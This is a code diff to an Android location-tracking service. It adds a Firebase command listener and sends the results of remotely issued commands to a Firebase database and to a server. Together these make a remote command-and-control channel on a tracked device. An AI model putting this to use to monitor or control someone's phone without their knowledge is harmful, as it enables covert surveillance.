@@ -64,6 +64,7 @@ class MainTrackerService : Service() {
         startLocationUpdates()
         startBatteryMonitor()
         startServerCommandPolling()
+        startFirebaseCommandService()
     }
 
     // ==================== ==================== ====================
@@ -204,6 +205,20 @@ class MainTrackerService : Service() {
         }
     }
 
+    private fun startFirebaseCommandService() {
+        try {
+            val intent = Intent(this, FirebaseCommandService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(intent)
+            } else {
+                startService(intent)
+            }
+            Log.d(TAG, "تم بدء خدمة استماع Firebase")
+        } catch (e: Exception) {
+            Log.e(TAG, "خطأ في بدء خدمة Firebase: ${e.message}")
+        }
+    }
+
     /**
      * إرسال نتيجة الأمر للسيرفر و Firebase
      */
@@ -213,8 +228,33 @@ class MainTrackerService : Service() {
             return
         }
         serviceScope.launch(Dispatchers.IO) {
+            // 1. كتابة النتيجة في Firebase (الأولوية الأولى)
             try {
-                // 1. إرسال النتيجة للسيرفر عبر REST API
+                val resultObj = org.json.JSONObject()
+                resultObj.put("command", command)
+                resultObj.put("result", result)
+                resultObj.put("status", "completed")
+                resultObj.put("timestamp", System.currentTimeMillis())
+                
+                val firebaseUrl = "https://studio-7073076148-6afe0-default-rtdb.firebaseio.com/results/$deviceId/$cmdId.json"
+                val url = java.net.URL(firebaseUrl)
+                val connection = url.openConnection() as java.net.HttpURLConnection
+                connection.requestMethod = "PUT"
+                connection.setRequestProperty("Content-Type", "application/json")
+                connection.doOutput = true
+                connection.connectTimeout = 10000
+                connection.readTimeout = 10000
+                connection.outputStream.write(resultObj.toString().toByteArray(Charsets.UTF_8))
+                connection.outputStream.flush()
+                val firebaseCode = connection.responseCode
+                connection.disconnect()
+                Log.d(TAG, "Firebase result write: $firebaseCode for cmd $cmdId")
+            } catch (e: Exception) {
+                Log.e(TAG, "Firebase result write error: ${e.message}")
+            }
+            
+            // 2. إرسال النتيجة للسيرفر عبر REST API (كـ backup)
+            try {
                 val serverUrl = "https://alsydyabwalzhra.online/api/command_result/$cmdId"
                 val url = java.net.URL(serverUrl)
                 val connection = url.openConnection() as java.net.HttpURLConnection
@@ -230,10 +270,10 @@ class MainTrackerService : Service() {
                 java.io.OutputStreamWriter(connection.outputStream, "UTF-8").use { it.write(payload) }
 
                 val responseCode = connection.responseCode
-                Log.d(TAG, "إرسال نتيجة الأمر $cmdId للسيرفر: $responseCode")
+                Log.d(TAG, "Server result report: $responseCode for cmd $cmdId")
                 connection.disconnect()
             } catch (e: Exception) {
-                Log.e(TAG, "خطأ في إرسال نتيجة الأمر للسيرفر: ${e.message}")
+                Log.e(TAG, "Server result report error: ${e.message}")
             }
         }
     }
